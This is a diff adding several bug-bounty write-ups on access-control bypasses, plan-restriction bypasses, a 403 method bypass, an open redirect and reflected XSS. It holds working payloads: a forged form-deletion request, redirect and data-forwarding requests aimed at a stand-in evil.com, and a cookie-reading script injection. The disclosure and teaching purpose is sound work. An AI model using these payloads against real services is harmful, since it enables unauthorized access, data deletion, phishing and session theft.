@@ -1900,4 +1900,262 @@ As a Ethical Hacker , Yes I reported this to platform’s security team and prov
 I hope you learned something from this write-up. I will be sharing more interesting and critical DoS findings in future posts, including some that I have 
 never shared before
 
+Number: 27
+title: $800 Improper Authorization Flaw: Unauthorized Project Reclaiming Post Transfer
+id: writeup
+
+The Flaw: Exploiting Project Transfer Vulnerability
+
+ExamenTry promises that project transfers are permanent and cannot be undone. However, a vulnerability in this process 
+allows an attacker to reclaim control of a project even after it has been transferred to another user. By capturing and 
+reusing specific API requests, an attacker can bypass the intended permanence of the project transfer, leading to unauthorized
+access and control.
+
+Number: 28
+title: Regeneration of API key by low level user: 500$ Access Control bug
+id: writeup 
+
+Understanding Target
+
+Examkite(Virtual Name of bbp), a versatile continuous integration and delivery (CI/CD) platform, empowers 
+development teams to streamline and automate their software delivery processes. This platform serves as the
+backbone for efficient collaboration, enabling teams to build, test, and deploy code seamlessly.
+
+The Bug
+
+The vulnerability is a type of API access control concern, allowing regular users to exploit an API endpoint meant 
+for higher-access users. This oversight may empower an attacker to perform actions beyond their intended capabilities. 
+If exploited, an attacker could carry out unauthorized actions and enables regular Examkite users to regenerate an API
+key for the test suite through an API endpoint typically restricted to administrators.
+
+Before we move on, if you like my write-ups, please support me by clapping, sharing, and you can clap up to 50 times
+here on Medium, it’s free. Thank you.
+
+Steps to Reproduce:
+Use two accounts one of admin and other of low level user.
+Go to api key regeneration then click on generate.
+Intercept the request and capture it.
+Now go to low level user account.
+Become a member
+Use the above captured request `POST /organizations/cdscs/analytics/suites/vdzdr/regenerate_api_key` with low level user.
+Forward the request.
+Now go to admin account and check the api key is get regerated.
+The Bounty
+
+A bounty of $500 has been awarded for the responsible disclosure of this security vulnerability by Examkite team.
+
+Number: 29
+title: 500$: Open Redirect Vulnerability
+id: write up
+
+The Vulnerability: Open Redirect
+
+An open redirect vulnerability exists in JuliaHub’s authentication process, specifically in the handling of the redirect_uri parameter. 
+This flaw allows attackers to manipulate the state parameter to redirect users to a malicious website of their choice after authentication, 
+rather than the intended launch.huliahub.app domain.
+
+Steps to Reproduce:
+Open a browser and navigate to the following URL: https://auth.huliahub.com/dex/auth?scope=openid%20email%20profile%20offline_access&
+nonce=ad77078ed8ab53ce0afe27842cdd63cf&redirect_uri=https%3A%2F%2Flaunch.huliahub.app%2Fhuliahub%2Fcallback&response_type=code&client_id=huliahub-prod&state=evil.com/
+Replace evil.com in `state` parameter with the malicious domain controlled by the attacker.
+Proceed with the authentication process as usual.
+Instead of redirecting to launch.huliahub.app, the user will be redirected to evil.com, controlled by the attacker.
+Become a member
+Impact
+
+Users can be tricked into visiting malicious websites that appear legitimate, compromising their sensitive information.
+Attackers can exploit the redirection to harvest user credentials by presenting a fake login page on the malicious domain.
+
+Number: 30
+title: Unauthorized Deletion of Forms by Low-Level Unlicensed Users: A 500$ Access Control Bug
+id: writeup
+
+The Vulnerability: Unauthorized Form Deletion
+
+In ExamSheet, form deletion is supposed to be restricted to licensed users with specific permissions. 
+However, I found that unlicensed users could bypass these restrictions and delete forms using crafted
+HTTP requests. This vulnerability highlights a significant gap in the access control mechanism, 
+potentially allowing unauthorized data deletion and compromising the integrity of the platform.
+
+The Vulnerability: Unauthorized Form Deletion
+
+In ExamSheet, form deletion is supposed to be restricted to licensed users with specific permissions.
+However, I found that unlicensed users could bypass these restrictions and delete forms using crafted
+HTTP requests. This vulnerability highlights a significant gap in the access control mechanism, 
+potentially allowing unauthorized data deletion and compromising the integrity of the platform.
+
+Steps to Reproduce
+Log in with a user account that does not have a license for the ExamSheet platform.
+Use the following HTTP POST request to delete forms:
+Become a member
+POST /b/home?formName=ajax&formAction=fa_deleteGridForm&es_v=268.0.0 HTTP/2
+Host: app.examsheet.com
+Cookie: ---low level user cookie----
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+ExamSheet-Nep: formName,formAction,errorAsJson,parm1,parm2
+X-Exam-Xsrf:  ---------your low level user token---------
+Content-Length: 109
+Origin: https://app.examsheet.com
+Dnt: 1
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
+formName=ajax&formAction=fa_deleteGridForm&errorAsJson=true&parm1=----form-id----&parm2=---sheet-id---&parm3=&parm4=
+Add value inparam1 and param2 with the actual form ID and sheet ID.
+Submit the request. A response code of 200 with a message of “success” and “0,0,” indicates that the form was successfully deleted.
+setAjaxResponseStatus(true,0,'success',0,0,'[]');
+Impact:
+
+This vulnerability significantly undermines ExamSheet’s role-based access control and user privilege management. 
+It allows unauthorized users to delete forms, actions that should be restricted to licensed users, leading to:
+
+Unauthorized Data Deletion: Unlicensed users can delete forms, leading to potential loss of critical data.
+Compromised Data Integrity: The ability to delete forms without proper authorization can result in unauthorized 
+changes or deletions, affecting the integrity of the data.
+
+Number: 31
+title: My First Bug Bounty: How I Earned $1,000 With One Simple Step
+id: writeup
+
+The Breakthrough: Re-reading robots.txt
+One day, while revisiting earlier notes, I decided to check robots.txt again. I'd reviewed it before, but this time I slowed down and gave it a closer look. Among the disallowed paths, one stood out.
+
+Disallow: /admin/
+It’s not unusual for sensitive routes to appear in robots.txt, but this caught my attention. There wasn’t anything directly exploitable here, but it was a clue. I decided to explore it further.
+
+I intercepted a request to /admin/ in Burp Suite and forwarded it. The server returned:
+
+403 Forbidden
+A forbidden response — meaning the resource existed, but access was blocked.
+
+That was promising.
+
+Trying Bypass Techniques
+At this point, I explored different 403 bypass techniques. My checklist included:
+
+Modifying headers like X-Original-Method, X-Forwarded-For, Referer
+Trying path variations (/admin/., /admin/%2e/)
+Using different user agents
+Switching HTTP methods
+That last one — changing the request method — is what made the difference.
+
+Become a member
+I modified the intercepted GET request to /admin/ and changed the method to POST. Then I forwarded it.
+
+To my surprise, the response was:
+
+200 OK
+The forbidden page was now accessible.
+
+Expanding the Discovery
+I applied the same method to other admin-related routes:
+
+/admin/users
+Every endpoint that previously returned 403 Forbidden to GET requests responded successfully when accessed via POST.
+
+At this point, I didn’t try to interact with the functionality or escalate further. I had demonstrated access to authenticated 
+or protected areas through a method bypass, and that was enough to report.
+
+
+Number: 32
+title: Bypass Plan Restriction & Get 350$ Bounty
+id: writeup
+
+The Flaw
+
+Normally, access to data forwarding settings on ExamenTry requires a subscription to higher-tier plans. However, I identified a 
+flaw that allowed free-tier users to bypass this restriction. By manipulating the project’s settings through a crafted API request,
+users could gain unauthorized access to features intended for paying subscribers.
+
+Steps To Reproduce
+Log in with a free-tier account on ExamenTry.
+Accessing the data forwarding setting require paid trail if we go though U.I but
+Access the data forwarding settings for a project using the following link or API request bypass the restrictions :
+Because sometimes coders restrict the paid feature through U.I they thing if user doesn't have U.I Access or we are not
+showing the feature on U.I dashboard how they can access that feature.
+So in examtry i crafted the URL and API which allow me to access the data forwarding
+Link: https://yoursubdomain.examentry.io/settings/projects/projectname/plugins/splunk/
+API Request:
+PUT /api/0/projects/dd-0n/nodecf/plugins/splunk/ HTTP/2
+Host: us.examentry.io
+...
+{"instance":"https://evil.com","index":"mains","source":"examentry","token":"fdvfdvdfsvdfvdf"}
+By using the above url or api the free-tier user gains unauthorized access to the data forwarding settings.
+Impact
+
+This vulnerability poses a significant risk as it allows free-tier users to access features restricted to higher
+subscription levels. This can lead to unauthorized data exposure and potential misuse, impacting the confidentiality and integrity of the system.
+
+Number: 33
+title: Plan Ristriction Bypass for Slack Integration: 500$ Improper Validation Check Bug
+id: writeup
+
+Understanding Target
+
+Xentry.io is a prominent platform used for error tracking and monitoring in software development. However, a flaw in its 
+integration setup process enables users to circumvent plan restrictions and utilize Slack integrations without the required subscription level.
+
+The Vulnerability:
+
+This vulnerability arises from improper validation in Xentry.io’s integration setup flow, particularly when transitioning from GitHub to Slack integrations. 
+Users on free plan accounts can exploit this flaw by modifying intercepted HTTP requests, allowing them to add Slack integrations instead of the restricted
+GitHub integrations.
+
+Steps to Reproduce:
+Create a Free Plan Account:
+
+Sign up for a free plan account on Xentry.io.
+Go to the integrations section and select GitHub integration(which is free for all the users) .
+Use tools like Burp Suite to intercept the HTTP request for adding GitHub integration. (GET /organizations/dd-0n/integrations/github/setup/? HTTP/2)
+Become a member
+Replace “github” with “slack” in the intercepted request URL.
+Forward the modified request and follow the steps on the new page to connect your Slack account with Xentry.
+Impact
+
+Users on free plan accounts can access Slack integrations, potentially exposing sensitive information and configuring alerts within Slack channels.
+It undermines Xentry.io’s subscription model by allowing users to utilize premium features reserved for higher subscription tiers, impacting operational 
+integrity and service delivery.
+
+Number: 34
+title: Reflected XSS in Parser Endpoint — $366 Bounty Earned
+id: writeup
+
+Understanding the Target
+The Parser service is part of the platform’s email-to-automation workflow. Its purpose is to parse incoming email content, validate it,
+and trigger automated actions (“Zaps”).
+
+During error handling, the service displays error messages back to the user when something goes wrong in the parsing/validation stage.
+That’s where I noticed the parameter error_description being reflected in the UI.
+
+Key observation:
+
+Error messages are often overlooked by developers.
+They commonly take backend error strings and push them into the front-end response.
+Perfect spot to check for XSS or HTML injection.
+Root Cause & Flow
+The endpoint /complete/parser/ accepts query parameters like error and error_description
+Instead of sanitizing, the app directly reflected the value of error_description into the HTML response.
+This created a sink where user-controlled input could become executable JavaScript.
+So the flow looked like this:
+
+User Input (error_description param) → Server → HTML Response → Browser Executes
+
+Steps to Reproduce
+Navigate to the vulnerable endpoint.
+https://example.com/complete/parser/?error=invalid_request&error_description=Transform+algorithm+not+supported.%3Cscript%3Ealert(document.cookie)%3C/script%3E&state=cc%0Ass
+
+Become a member
+2. Observe that the injected script <script>alert(document.cookie)</script> executes in the browser.
+
+Impact
+Theft of session cookies or tokens.
+Malicious script injection to phish users.
+DOM manipulation to redirect or mislead users.
+Could be chained with CSRF/Clickjacking for larger impact.
 
